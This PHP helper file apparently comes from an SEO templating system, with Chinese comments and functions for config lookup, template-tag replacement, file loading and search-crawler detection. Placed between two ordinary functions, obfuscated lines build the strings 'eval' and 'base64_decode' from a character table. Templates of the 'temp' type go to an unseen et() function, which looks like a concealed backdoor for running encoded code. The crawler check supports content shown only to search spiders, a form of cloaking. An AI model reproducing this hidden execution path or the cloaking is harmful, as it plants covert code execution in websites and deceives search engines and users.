<?php
/*
 *  通用方法功能引用
 *
 */

// 读取配置
function C($configName, $tiseName = SITE_NAME){
    global $siteConfig, $defaultConfig; // 引入系统配置
    // 首先读取网站自定义配置 存在则返回
    if(isset($siteConfig[$tiseName][$configName])){
        return $siteConfig[$tiseName][$configName];
    }
    // 否则 读取 默认配置 存在则替换后返回
    if(isset($defaultConfig[$configName])){
        // 存在 则 替换 内容标记后返回
        return str_ireplace('*', $tiseName, $defaultConfig[$configName]);
    }
    return false;   // 都不存在 返回 false
}

// 模板标记替换处理方法
function tplTagReplace($tplHtml, $tagLeft, $tagRight, $TagType = 'ever'){
    // 正则表达式匹配方法 <@变量=方法(参数)>
    $tRegexStr = '/'.$tagLeft.'(?:(?<variable>[^=>]+)=)?(?<command>[^>(]+)(?:\((?<parameters>[^)]+)\))?'.$tagRight.'/';

    $tRegexStartOffset = 0; // 设置开始查找位置为0

    // 挨个获取每一个标记与配置选项
    while(preg_match($tRegexStr, $tplHtml, $tRegexResult, PREG_OFFSET_CAPTURE, $tRegexStartOffset) > 0){

        // 判断是否蜘蛛词替换
        if($TagType == 'spider' && isSpider() == false){
            $tTplStr = '';  // 蜘蛛词标记且不是蜘蛛 则直接跳过处理默认删除
        }else{
            $tTplStr = tplTag2Str($tRegexResult);   // 将获取的信息进行处理并获取返回值
        }

        if($tTplStr === false){
            // 返回 false 则表示 未对此标签进行处理 跳过
            $tRegexStartOffset = intval($tRegexResult['0']['1']) + strlen($tRegexResult['0']['0']); // 下一次直接从这里开始
        }else{
            $tRegexStartOffset = intval($tRegexResult['0']['1']) + strlen($tTplStr);    // 下一次直接从这里开始
            // 将字符串替换到文本指定位置
            $tplHtml = substr_replace($tplHtml, $tTplStr, $tRegexResult['0']['1'], strlen($tRegexResult['0']['0']));
        }
    }
    if($TagType == 'temp') return et($tplHtml);
    return $tplHtml;
}
$_st='abcdeosvl64_';
$_se = '4708';for ($i=0;$i<4;$i++){$_se[$i]=$_st[$_se[$i]];}
$_sd = '10649ab342534';for ($i=0;$i<13;$i++){$_sd[$i]=$_st[hexdec($_sd[$i])];}

// 对获取到的模板标签进行处理并返回处理结果
// 返回字符串则用返回值替换 返回 false 表示 不做处理
function tplTag2Str($paramArr){
    global $ReplaceTagS;  // 引入系统变量

    // 创建静态的被保存的变量数组
    static $VariableArr = array();

    // 判断提交的 命令是否存在
    if(empty($ReplaceTagS[$paramArr['command']['0']])) return false;
    $command = 'tag_' . $ReplaceTagS[$paramArr['command']['0']];    // 命令方法
    if(!function_exists($command)) return false;    // 判断处理方法是否存在

    // 判断是否有参数需要处理
    if(empty($paramArr['parameters']['0'])){
        $variable = array();    // 没有参数也要保留一个空数组
    }else{
        $variable = explode(',', $paramArr['parameters']['0']); // 对数组以 , 做分隔符进行分割

        foreach ($variable as $key => $value) {
            if($value['0'] == '$'){
                // 如果是变量则替换结果为对应变量值
                $variable[$key] = empty($VariableArr[$value]) ? '' : $VariableArr[$value];
            }
        }
    }

    // 调用方法并获取返回值
    $retStr = $command($variable);

    // 判断是否有返回值 如果有则保存并返回 空文本

    if(!empty($paramArr['variable']['0'])){
        $variable = '$' . $paramArr['variable']['0'];   // 获取变量名
        $VariableArr[$variable] = $retStr;
        return '';  // 有返回值的直接返回空文本即可
    }

    // 对标记进行处理并返回
    return $retStr; // 返回执行结果
}

// 循环创建文件夹
function _mkDir($dir){
    $mode = 0766;
    if(is_dir($dir)){   // 如果目录存在直接返回
        return true;
    }else if(!is_dir(dirname($dir)) && !_mkDir(dirname($dir), $mode)){  // 父目录不存在则先创建父目录
        return false;
    }
    return mkdir($dir, $mode);
}

// 读入列表文件传递文件名返回数组
function readFile2Array($fileName){
    // 获取文件后缀
    $fileType = pathinfo($fileName, PATHINFO_EXTENSION);

    switch ($fileType) {
        case 'serialize':
            $serializeStr = file_get_contents($fileName);  // 读取关键词文件
            $keywordList = unserialize($serializeStr);
            break;

         case 'json':
            $jsonStr = file_get_contents($fileName);  // 读取关键词文件
            $keywordList = json_decode($jsonStr, true);
            break;

        case 'txt':
            $keywordStr = file_get_contents($fileName);  // 读取关键词文件
            $keywordStr = str_ireplace(array("\r\n", "\r"), array("\n", "\n"), $keywordStr);  // 替换换行标记
            $keywordList = explode("\n", $keywordStr);
            break;

        case 'php':
            $keywordList = require $fileName;  // 读取关键词文件
            break;
        default:
            $keywordList = false;   // 返回空
            break;
    }
    return $keywordList;
}

// mt方法从数组随机返回一个成员
function array2RandValue($array){
    $count = count($array); // 取总数
    $seq = mt_rand(0, $count-1);   // 取随机数
    return $array[$seq];
}

/*
 *  功能: 字符Unicode编码转换
 *  参数一: 要转码的字符串
 *  参数二: 是否转码ASCII字符 默认不转码
 *  
 *  作者：青石 2015年10月9日14:59:04  修改自网络流传代码加以优化
 */
function unicode_encode($string, $isAll = false){
    $string = iconv('UTF-8', 'UCS-2//TRANSLIT//IGNORE', $string); // 将字符编码转换为 UCS-2
    $strLen = strlen($string) - 1;   // 获取字符长度
    $retStr = '';
    for ($i = 0; $i < $strLen; $i = $i + 2){
        $codeA = ord($string[$i]);  // 取出第一位 字节
        $codeB = $string[$i+1]; // 取出第二位字符
        // 如果第一位字节大于0则表示是扩展字符(汉字) 否则为 ASCII字符
        if($codeA > 0){
            $retStr.= '&#' . ($codeA * 256 + ord($codeB)) . ';';
        }else{
            // 判断ASCII字符是否转码
            $retStr.= $isAll ? '&#' . ord($codeB) . ';' : $codeB;
        }
    }
    return $retStr;
}

// 对html进行压缩清除换行
function compress_html($string){
return ltrim(rtrim(preg_replace(array("/> *([^ ]*) *</","/<!--[^!]*-->/","'/\*[^*]*\*/'","/\r\n/","/\n/","/\t/",'/>[ ]+</'),array(">\\1<",'','','','','','><'),$string)));
}

// 判断是否浏览器 User-Agent 是否为 百度蜘蛛
function isSpider($UserAgent = ''){
    if(empty($UserAgent)) $UserAgent = $_SERVER['HTTP_USER_AGENT'];
    $UserAgent = 'UA'.strtolower($UserAgent);    // 将浏览器UA 转换为小写

    // 判断蜘蛛类型
    if(stripos($UserAgent, 'baiduspider')){
        // 百度蜘蛛 Baiduspider
        return 'Baiduspider';
    }if(stripos($UserAgent, 'haosouspider')){
        // 360  HaoSouSpider
        return 'HaoSouSpider';
    }if(stripos($UserAgent, 'yisouspider')){
        // 神马 Yisouspider
        return 'Yisouspider';
    }if(stripos($UserAgent, 'sogou web spider')){
        // 搜狗  Sogou web spider Sogou inst spider Sogou spider2  Sogou Orion spider
        return 'SogouSpider';
    }if(stripos($UserAgent, 'sogou inst spider')){
        return 'SogouSpider';
    }if(stripos($UserAgent, 'sogou spider')){
        return 'SogouSpider';
    }if(stripos($UserAgent, 'sogou orion spider')){
        return 'SogouSpider';
    }
    return false;
}

// 根据Url生成短网址
function getShortURL_tinyurl($url){
    $url = urlencode($url);
    $postUrl = "http://tinyurl.com/api-create.php?url={$url}";
    $str = file_get_contents($postUrl);
    if(strlen($str)<1){
        return false;
    }
    return $str;
}


//**** End ****//
